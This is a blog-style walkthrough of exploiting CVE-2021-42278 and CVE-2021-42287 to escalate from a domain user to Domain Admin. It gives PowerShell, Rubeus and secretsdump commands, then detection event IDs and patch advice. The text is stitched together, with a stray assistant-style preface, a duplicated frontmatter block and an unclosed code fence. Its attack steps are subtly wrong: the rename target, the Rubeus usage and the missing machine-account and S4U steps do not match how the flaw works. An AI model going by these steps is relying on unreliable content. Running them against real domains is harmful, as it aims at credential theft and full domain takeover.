---
title: Exploiting CVE-2021-42278 & CVE-2021-42287 ‚Äì From User to Domain Admin
published: 2025-04-19
updated: 2025-04-19
description: 'Simulating a real-world privilege escalation attack using CVE-2021-42278 and CVE-2021-42287 in Active Directory to gain Domain Admin access from a low-privileged user'
image: 'CVE-2021-42278.webp'
tags: [CVEs]
category: 'Active Directory Attacks'
draft: false 
lang: 'ar-eng'
---

Here's the enhanced Markdown version with formatting fixes and improved consistency:

```markdown
---
title: Abusing CVE-2021-42278 & CVE-2021-42287 - From User to Domain Admin
description: 'Exploiting SAMAccountName spoofing and Kerberos escalation vulnerabilities to compromise Active Directory domains'
---

## Table of Contents

1. [Introduction](#cve-2021-42278--cve-2021-42287-from-user-to-domain-admin-simulating)
2. [Why is this Attack Important?](#why-is-this-attack-important)
3. [Vulnerability Overview](#vulnerability-overview)  
   - [CVE-2021-42278 ‚Äì SAMAccountName Spoofing](#cve-2021-42278-samaccountname-spoofing)  
   - [CVE-2021-42287 ‚Äì Kerberos Privilege Escalation](#cve-2021-42287-kerberos-privilege-escalation)
4. [Lab Setup (Tools + Env)](#lab-setup-tools--env)
5. [Step-by-Step Exploitation](#step-by-step-exploitation)  
   - [Step 1: Login as a regular user](#step-1-login-as-a-regular-user)  
   - [Step 2: Rename a Computer Object](#step-2-rename-a-computer-object-to-a-user-like-name)  
   - [Step 3: Modify sAMAccountName](#step-3-modify-samaccountname-to-match-user-name)  
   - [Step 4: Request a TGT](#step-4-request-a-tgt-for-the-spoofed-computer)  
   - [Step 5: Impersonate the Domain Controller](#step-5-impersonate-the-domain-controller--perform-dcsync)  
   - [Step 6: Domain Admin Access](#step-6-profit--domain-admin-access)
6. [Detection & Blue Team View](#detection--blue-team-view)
7. [Patch & Mitigation Tips](#patch--mitigation-tips)
8. [References + Final Thoughts](#references--final-thoughts)

---

## CVE-2021-42278 && CVE-2021-42287: From User to Domain Admin - Simulating

In the world of **advanced cyber attacks** on Active Directory, several vulnerabilities continue to affect systems even after updates. One such critical vulnerability duo discovered in late 2021 were **CVE-2021-42278** and **CVE-2021-42287**, allowing escalation from **low-privileged user to Domain Admin** using **simple tools**.

### Why is this attack important?

This attack is unique for several reasons:

- **No misconfigurations required**: Relies solely on Active Directory vulnerabilities
- **Simplicity of exploitation**: Easy escalation to **Domain Admin** with minimal effort

In this post, we'll **simulate** this attack in a lab environment using these CVEs on unpatched systems.

---

### Vulnerability Overview

#### üìå CVE-2021-42278: SAMAccountName Spoofing
Allows spoofing computer account names to appear as user accounts. Attackers can create **fake computer objects** with user-like `sAMAccountName` values.

#### üìå CVE-2021-42287: Kerberos Privilege Escalation
Enables privilege escalation through **Kerberos TGT manipulation**, allowing Domain Controller impersonation and **DCSync attacks**.

---

### Lab Setup (Tools + Env)

| **Component**       | **Description**                                  |
|---------------------|--------------------------------------------------|
| **OS**              | Windows Server 2019 (unpatched, pre-Nov 2021)    |
| **Tools**           | Mimikatz, Rubeus, Impacket, KrbRelayUp           |
| **User Account**    | Low-privileged user (`amr.user@corp.local`)      |
| **Domain Controller** | Unpatched (pre-Nov 2021 patches)                |

---

### Step-by-Step Exploitation

#### Step 1: Login as a regular user
Assume compromised credentials for low-privileged user `amr.user@corp.local`

#### Step 2: Rename Computer Object to User-Like Name
```powershell
Rename-ADObject "CN=WIN10-CLIENT,CN=Computers,DC=corp,DC=local" -NewName "amruser"
```

#### Step 3: Modify sAMAccountName
```powershell
Set-ADComputer -Identity "amruser" -SamAccountName "amruser"
```

#### Step 4: Request TGT for Spoofed Computer
```bash
rubeus tgtdeleg /user:amruser$ /rc4:<ntlm_hash> /domain:corp.local
```

#### Step 5: Impersonate Domain Controller & DCSync
```bash
secretsdump.py -k -no-pass CORP/amruser$@dc.corp.local
```

#### Step 6: Profit ‚Äì Domain Admin Access
Use dumped credentials to access privileged accounts.

---

### Detection & Blue Team View

**Key Detection Points:**
- üîç **Event ID 4741**: Computer account creation
- üîç **Event ID 4781**: SAMAccountName changes
- üîç **Kerberos TGT Anomalies**
- üîç **Unusual DC impersonation attempts**

---

### Patch & Mitigation Tips

1. ‚úÖ Apply November 2021 Security Updates
2. ‚úÖ Restrict Computer Object Modifications
3. ‚úÖ Monitor SAMAccountName Changes
4. ‚úÖ Implement Least Privilege Access

---

### References + Final Thoughts

**Official Resources:**
- [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
- [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)

**Tool References:**
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

This attack chain demonstrates how **inherent Active Directory vulnerabilities** can enable full domain compromise without misconfigurations. Regular patching and strict monitoring are essential for AD security.